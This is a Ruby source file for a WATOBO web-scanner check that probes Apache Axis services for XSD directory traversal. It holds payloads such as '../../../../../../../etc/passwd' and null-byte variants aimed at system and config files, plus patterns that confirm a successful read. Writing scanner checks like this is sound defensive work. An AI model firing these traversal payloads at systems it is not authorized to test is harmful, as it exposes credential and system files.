# @private
module Watobo#:nodoc: all
  module Modules
    module Active
      module Axis


        class Axis_xsd < Watobo::ActiveCheck

          @info.update(
              :check_name => 'Axis XSD Directory Traversal',    # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => AC_GROUP_AXIS,
              :description => "Check AXIS service for xsd directory traversal.",   # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "0.9"   # check version
          )



          @finding.update(
              :class => "Apache AXIS XSD",    # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN,         # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
          :rating => VULN_RATING_MEDIUM
          )

          def reset()
            @checked_paths.clear
          end

          def initialize(project, prefs={})
            super(project, prefs)


            measure = "Update to newest AXIS version."

            @checked_paths = Hash.new

            @traversals = [
                ["../../../../../../../etc/passwd",'root:[^:]+:\w+:\w+' ],
                ["../../../../../../../etc/passwd%00",'root:[^:]+:\w+:\w+' ],
                ["../../../../../../../boot.ini", Regexp.quote('[boot loader]')],
                ["../../../../../../../boot.ini%00", Regexp.quote('[boot loader]')],
                ['../conf/axis2.xml','org.apache.axis2']
            ]


          end

          def generateChecks(chat)
            wp = chat.request.path
            unless @checked_paths.has_key?(wp)
                @checked_paths[wp] = :checked
                @traversals.each do |tf, pattern|
                    checker = proc {

                      test = chat.copyRequest
                      param = UrlParameter.new(name: 'xsd', value: tf)
                      test.set param
                      status, test_request, test_response = fileExists?(test, :default => true)
                      if test_response.body.to_s =~ /#{pattern}/i
                        #test_chat = Chat.new(test, test_response,chat.id)
                        # resource = "/" + test_request.resource
                        addFinding( test_request, test_response,
                                    :check_pattern => "#{tf}",
                                    :test_item => "#{tf}",
                                    :chat => chat,
                                    :title => "[#{wp}]"

                        )
                      end

                      [ test_request, test_response ]
                    }
                    yield checker
                  end
            end
            end
            end
          end
        end
  end
end
